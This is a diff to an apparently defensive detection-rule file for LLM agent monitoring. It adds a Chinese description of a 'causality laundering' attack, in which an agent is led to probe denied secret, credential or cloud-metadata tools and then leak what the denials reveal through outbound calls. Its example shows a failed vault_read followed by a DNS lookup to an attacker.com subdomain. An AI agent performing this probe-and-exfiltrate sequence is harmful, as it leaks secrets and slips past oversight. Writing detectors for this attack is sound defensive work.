@@ -86,3 +86,15 @@ sql_template: |
     -- 3-minute causal window: outbound must follow denial, not precede it
     AND oc.event_time > probe.event_time
     AND oc.event_time < probe.event_time + INTERVAL 3 MINUTE
+translations:
+  zh-CN:
+    name: "因果关系洗白:拒绝反馈泄漏检测器"
+    description: |
+      检测因果关系洗白攻击(arXiv:2604.04035,2026年4月),攻击者促使调用工具的 LLM 智能体探测受保护/被拒绝的操作,从拒绝结果中推断出私密信息(存在性预言、权限边界泄漏),然后在同一会话内通过后续看似良性的出站工具调用外泄推断出的信息。该攻击可规避扁平化的溯源追踪,因为泄漏的信息源自被拒绝操作的因果影响,而非直接的数据流。论文提出了具有反事实边的 ARM(智能体参考监视器);本规则在 CIM 事件层检测该行为特征,而无需完整的 ARM 插桩。检测方式:对 tool_complete(tool_success=false,敏感工具)之后3分钟内、同一 session_id + run_id 下发生的 tool_invoke(出站/通信工具)执行时序自连接(temporal self-JOIN)。敏感探测对象包括文件、密钥、数据库、记忆、凭据访问,以及云元数据 IMDS 端点和密钥管理工具。出站通道包括 HTTP、邮件、Slack、webhook、Telegram、DNS 解析、日志工具和上传/发布类操作。v0.3.0 将敏感探测覆盖范围扩展至云密钥管理器 API 工具(vault_read、get_secret_value、read_config、get_env、load_key、secrets_manager、kms_decrypt)和元数据 IMDS 工具(imds_fetch、metadata_query、cloud_metadata、ec2_metadata)——这些是云端智能体部署中高价值的拒绝预言目标。同时将出站通道扩展至 upload_file、dns_resolve、telegram_send、publish_event、create_webhook 和 firecrawl_scrape 等在近期 arXiv:2604.04035 概念验证演示中观察到的模式。
+
+      不同于 rp-027(跨会话泄漏:跨会话的输出复用)和 rp-033(ADAM 记忆提取:系统化查询操纵),因为因果关系洗白需要一个被拒绝的操作作为信息来源。
+
+      References: arXiv:2604.04035 (Causality Laundering Apr 2026), OWASP LLM06:2025, OWASP Agentic AI ASI03:2026 -
+      - https://arxiv.org/abs/2604.04035,
+      Example: vault_read(path="secret/prod/db_password") returns tool_success=false, followed within 90 seconds by dns_resolve(domain="d-b-e-x-i-s-t-s.attacker.com") in same session (DNS exfil of existence oracle)
+      - https://owasp.org/www-project-top-10-for-large-language-model-applications/
